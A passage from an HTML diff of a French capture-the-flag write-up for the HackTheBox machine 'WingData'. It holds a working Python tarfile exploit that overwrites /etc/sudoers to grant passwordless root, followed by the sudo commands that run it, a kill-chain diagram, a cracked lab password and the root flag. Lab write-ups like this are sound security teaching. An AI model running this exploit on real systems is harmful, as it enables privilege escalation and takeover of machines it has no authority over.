+<li>Un <strong>symlink &ldquo;escape&rdquo;</strong> vers <code>/etc</code> via le chemin non résolu</li>
+<li>Un <strong>hardlink</strong> vers <code>escape/sudoers</code></li>
+<li>Un <strong>fichier régulier</strong> qui écrase le hardlink → écrit dans <code>/etc/sudoers</code></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tarfile<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>comp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">247</span>
+</span></span><span style="display:flex;"><span>steps <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnop&#34;</span>
+</span></span><span style="display:flex;"><span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> tarfile<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;/opt/backup_clients/backups/backup_9999.tar&#34;</span>, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> tar:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> steps:
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, comp))
+</span></span><span style="display:flex;"><span>        a<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>DIRTYPE
+</span></span><span style="display:flex;"><span>        tar<span style="color:#f92672">.</span>addfile(a)
+</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, i))
+</span></span><span style="display:flex;"><span>        b<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>SYMTYPE
+</span></span><span style="display:flex;"><span>        b<span style="color:#f92672">.</span>linkname <span style="color:#f92672">=</span> comp
+</span></span><span style="display:flex;"><span>        tar<span style="color:#f92672">.</span>addfile(b)
+</span></span><span style="display:flex;"><span>        path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, comp)
+</span></span><span style="display:flex;"><span>    linkpath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>join(steps), <span style="color:#e6db74">&#34;l&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">254</span>)
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(linkpath)
+</span></span><span style="display:flex;"><span>    l<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>SYMTYPE
+</span></span><span style="display:flex;"><span>    l<span style="color:#f92672">.</span>linkname <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;../&#34;</span> <span style="color:#f92672">*</span> len(steps))
+</span></span><span style="display:flex;"><span>    tar<span style="color:#f92672">.</span>addfile(l)
+</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(<span style="color:#e6db74">&#34;escape&#34;</span>)
+</span></span><span style="display:flex;"><span>    e<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>SYMTYPE
+</span></span><span style="display:flex;"><span>    e<span style="color:#f92672">.</span>linkname <span style="color:#f92672">=</span> linkpath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/../../../../etc&#34;</span>
+</span></span><span style="display:flex;"><span>    tar<span style="color:#f92672">.</span>addfile(e)
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(<span style="color:#e6db74">&#34;flaglink&#34;</span>)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>LNKTYPE
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>linkname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;escape/sudoers&#34;</span>
+</span></span><span style="display:flex;"><span>    tar<span style="color:#f92672">.</span>addfile(f)
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;wacky ALL=(ALL) NOPASSWD:ALL</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>TarInfo(<span style="color:#e6db74">&#34;flaglink&#34;</span>)
+</span></span><span style="display:flex;"><span>    c<span style="color:#f92672">.</span>type <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>REGTYPE
+</span></span><span style="display:flex;"><span>    c<span style="color:#f92672">.</span>size <span style="color:#f92672">=</span> len(content)
+</span></span><span style="display:flex;"><span>    tar<span style="color:#f92672">.</span>addfile(c, fileobj<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>BytesIO(content))
+</span></span></code></pre></div><h3 id="exécution">Exécution<a hidden class="anchor" aria-hidden="true" href="#exécution">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 poc.py
+</span></span><span style="display:flex;"><span>sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_poc
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [+] Extraction completed</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (ALL) NOPASSWD: ALL</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo /bin/bash
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># c794091a39b1e79e7ac7ca626db009b2</span>
+</span></span></code></pre></div><hr>
+<h2 id="kill-chain">Kill Chain<a hidden class="anchor" aria-hidden="true" href="#kill-chain">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌──────────────────────────┐
+</span></span><span style="display:flex;"><span>│ Nmap → SSH + HTTP        │
+</span></span><span style="display:flex;"><span>│ wingdata.htb → ftp.      │
+</span></span><span style="display:flex;"><span>│ Wing FTP Server 7.4.3    │
+</span></span><span style="display:flex;"><span>└────────────┬─────────────┘
+</span></span><span style="display:flex;"><span>             │ CVE-2025-47812
+</span></span><span style="display:flex;"><span>             │ NULL byte Lua injection
+</span></span><span style="display:flex;"><span>┌────────────▼─────────────┐
+</span></span><span style="display:flex;"><span>│ Shell wingftp            │
+</span></span><span style="display:flex;"><span>│ XML configs → hashes     │
+</span></span><span style="display:flex;"><span>│ SHA256(pw + &#34;WingFTP&#34;)   │
+</span></span><span style="display:flex;"><span>└────────────┬─────────────┘
+</span></span><span style="display:flex;"><span>             │ Hashcat → wacky:!#7Blushing^*Bride5
+</span></span><span style="display:flex;"><span>┌────────────▼─────────────┐
+</span></span><span style="display:flex;"><span>│ SSH wacky                │
+</span></span><span style="display:flex;"><span>│ sudo restore script      │
+</span></span><span style="display:flex;"><span>│ Python 3.12.3            │
+</span></span><span style="display:flex;"><span>└────────────┬─────────────┘
+</span></span><span style="display:flex;"><span>             │ CVE-2025-4517
+</span></span><span style="display:flex;"><span>             │ tarfile PATH_MAX overflow
+</span></span><span style="display:flex;"><span>             │ → overwrite /etc/sudoers
+</span></span><span style="display:flex;"><span>┌────────────▼─────────────┐
+</span></span><span style="display:flex;"><span>│ ROOT                     │
+</span></span><span style="display:flex;"><span>└──────────────────────────┘
+</span></span></code></pre></div><h2 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h2>
+<ul>
+<li><strong>Root:</strong> c794091a39b1e79e7ac7ca626db009b2</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/underpass/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>UnderPass - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
